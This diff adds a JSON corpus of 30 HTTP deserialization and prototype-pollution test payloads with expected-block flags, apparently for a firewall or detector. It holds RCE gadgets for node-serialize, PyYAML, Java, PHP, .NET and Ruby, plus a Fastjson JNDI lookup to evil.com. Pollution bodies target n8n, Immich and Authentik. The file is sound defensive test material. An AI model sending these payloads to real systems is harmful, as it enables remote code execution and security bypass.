@@ -1,0 +1,375 @@
+[
+  {
+      "id": "DESER-GADGET-001",
+      "payload": "POST /api/import HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls')}()\"}",
+      "tags": [
+        "deserialization",
+        "gadget",
+        "node-serialize",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Node.js node-serialize RCE gadget marker",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-002",
+      "payload": "POST /api/data HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/xml\r\n\r\n<?xml version=\"1.0\"?><root><name>test</name></root>",
+      "tags": [
+        "gadget",
+        "content-type-confusion"
+    ],
+      "expected_block": false,
+      "severity_hint": "Medium",
+      "notes": "XML body with JSON Content-Type (no attack, testing parser confusion)",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-003",
+      "payload": "POST /api/settings HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/xml\r\n\r\n{\"test\":\"json\"}",
+      "tags": [
+        "gadget",
+        "content-type-confusion"
+    ],
+      "expected_block": false,
+      "severity_hint": "Medium",
+      "notes": "JSON body with XML Content-Type (reverse confusion)",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-004",
+      "payload": "POST /api/config HTTP/1.1\r\nHost: target.com\r\nContent-Type: text/plain\r\n\r\n{\"__proto__\":{\"admin\":true}}",
+      "tags": [
+        "gadget",
+        "content-type-confusion"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Prototype pollution with text/plain Content-Type",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-005",
+      "payload": "POST /api/yaml HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/x-yaml\r\n\r\n!!python/object/apply:os.system ['ls']",
+      "tags": [
+        "gadget",
+        "yaml-deserialization",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "YAML deserialization with Python gadget (PyYAML unsafe load)",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-006",
+      "payload": "POST /api/import HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/x-yaml\r\n\r\n!!python/object/new:subprocess.Popen ['ls']",
+      "tags": [
+        "gadget",
+        "yaml-deserialization",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "YAML subprocess.Popen gadget",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-007",
+      "payload": "POST /api/data HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/x-yaml\r\n\r\n!!python/object/apply:eval ['__import__(\"os\").system(\"ls\")']",
+      "tags": [
+        "gadget",
+        "yaml-deserialization"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "YAML eval gadget with os.system",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-008",
+      "payload": "POST /api/settings HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/java-serialized-object\r\n\r\nrO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAmXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAA",
+      "tags": [
+        "gadget",
+        "java-serialization",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Java serialized object (CommonsCollections gadget marker)",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-009",
+      "payload": "POST /api/import HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/x-java-serialized-object\r\n\r\nac ed 00 05 73 72 00 11 6a 61 76 61 2e 75 74 69 6c 2e 48 61 73 68 4d 61 70",
+      "tags": [
+        "gadget",
+        "java-serialization"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Java HashMap serialization magic bytes (ac ed 00 05)",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-010",
+      "payload": "POST /api/data HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/x-php-serialized\r\n\r\nO:8:\"stdClass\":1:{s:4:\"data\";s:5:\"value\";}",
+      "tags": [
+        "gadget",
+        "php-serialization"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "PHP serialized object (harmless stdClass)",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-011",
+      "payload": "POST /api/settings HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\nO:10:\"PentesterLab\":1:{s:4:\"file\";s:9:\"/etc/passwd\";}",
+      "tags": [
+        "gadget",
+        "php-object-injection",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "PHP object injection with file property (gadget marker)",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-012",
+      "payload": "POST /api/config HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\nO:8:\"Exploit\":2:{s:7:\"command\";s:2:\"ls\";s:4:\"exec\";b:1;}",
+      "tags": [
+        "gadget",
+        "php-object-injection",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "PHP object with command property (RCE gadget marker)",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-013",
+      "payload": "POST /api/user HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"@type\":\"java.net.Inet4Address\",\"val\":\"127.0.0.1\"}",
+      "tags": [
+        "gadget",
+        "fastjson-deserialization"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Fastjson deserialization gadget (@type Inet4Address)",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-014",
+      "payload": "POST /api/data HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://evil.com/Exploit\"}",
+      "tags": [
+        "gadget",
+        "fastjson-deserialization",
+        "jndi-injection",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Fastjson JNDI injection via JdbcRowSetImpl",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-015",
+      "payload": "POST /api/settings HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"@c\":\"com.example.Exploit\",\"cmd\":\"calc\"}",
+      "tags": [
+        "gadget",
+        "jackson-polymorphic"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Jackson polymorphic deserialization (@c type hint)",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-016",
+      "payload": "POST /api/config HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n[\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",{\"transletBytecodes\":[\"base64payload\"]}]",
+      "tags": [
+        "gadget",
+        "jackson-gadget",
+        "templatesimpl"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Jackson TemplatesImpl gadget (Java code execution)",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-017",
+      "payload": "POST /api/import HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\",\"MethodName\":\"Start\"}",
+      "tags": [
+        "gadget",
+        "dotnet-deserialization",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": ".NET ObjectDataProvider deserialization gadget",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-018",
+      "payload": "POST /api/data HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"__type\":\"System.IO.FileInfo\",\"FileName\":\"/etc/passwd\"}",
+      "tags": [
+        "gadget",
+        "dotnet-deserialization"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": ".NET FileInfo type hint (file access gadget)",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-019",
+      "payload": "POST /api/settings HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"ruby/object\":\"Gem::Specification\",\"data\":\"malicious_code\"}",
+      "tags": [
+        "gadget",
+        "ruby-marshal"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Ruby Marshal gadget (Gem::Specification abuse)",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-020",
+      "payload": "POST /api/config HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"ruby/object\":\"Gem::Installer\",\"spec\":\"malicious_spec\"}",
+      "tags": [
+        "gadget",
+        "ruby-marshal"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Ruby Gem::Installer gadget",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-021",
+      "payload": "POST /api/user HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json; charset=utf-16\r\n\r\n{\"test\":\"value\"}",
+      "tags": [
+        "gadget",
+        "charset-confusion"
+    ],
+      "expected_block": false,
+      "severity_hint": "Medium",
+      "notes": "UTF-16 charset confusion (parser bypass attempt)",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-022",
+      "payload": "POST /api/data HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json; boundary=----Boundary\r\n\r\n{\"test\":\"value\"}",
+      "tags": [
+        "gadget",
+        "boundary-confusion"
+    ],
+      "expected_block": false,
+      "severity_hint": "Low",
+      "notes": "Invalid boundary parameter in JSON Content-Type",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-023",
+      "payload": "POST /api/settings HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\nContent-Type: application/xml\r\n\r\n{\"test\":\"value\"}",
+      "tags": [
+        "gadget",
+        "duplicate-content-type"
+    ],
+      "expected_block": false,
+      "severity_hint": "Medium",
+      "notes": "Duplicate Content-Type headers (parser confusion)",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-024",
+      "payload": "POST /api/config HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\nX-Content-Type-Options: nosniff\r\n\r\n<xml><data>test</data></xml>",
+      "tags": [
+        "gadget",
+        "mime-sniffing"
+    ],
+      "expected_block": false,
+      "severity_hint": "Medium",
+      "notes": "XML body with JSON Content-Type and nosniff",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-025",
+      "payload": "POST /api/workflow HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"nodes\":[{\"type\":\"function\",\"code\":\"return {json: {polluted: true}};\"}]}",
+      "tags": [
+        "gadget",
+        "n8n-workflow",
+        "code-injection"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "n8n workflow with function node containing pollution",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-026",
+      "payload": "POST /api/execute HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"expression\":\"{{$json.__proto__.admin = true}}\"}",
+      "tags": [
+        "gadget",
+        "n8n-expression",
+        "template-injection"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "n8n expression with __proto__ pollution",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-027",
+      "payload": "POST /api/photos/upload HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"metadata\":{\"__proto__\":{\"isPublic\":true}}}",
+      "tags": [
+        "gadget",
+        "immich-metadata"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Immich photo metadata pollution",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-028",
+      "payload": "POST /api/albums HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"settings\":{\"constructor\":{\"prototype\":{\"shared\":true}}}}",
+      "tags": [
+        "gadget",
+        "immich-album"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Immich album settings pollution via constructor",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-029",
+      "payload": "POST /api/flows HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"stages\":[{\"__proto__\":{\"bypass\":true}}]}",
+      "tags": [
+        "gadget",
+        "authentik-flow"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Authentik flow stage pollution",
+      "category": "Deserialization"
+  },
+  {
+      "id": "DESER-GADGET-030",
+      "payload": "POST /api/policies HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"bindings\":[{\"__proto__\":{\"enabled\":false}}]}",
+      "tags": [
+        "gadget",
+        "authentik-policy"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Authentik policy binding pollution to disable security",
+      "category": "Deserialization"
+  }
+]
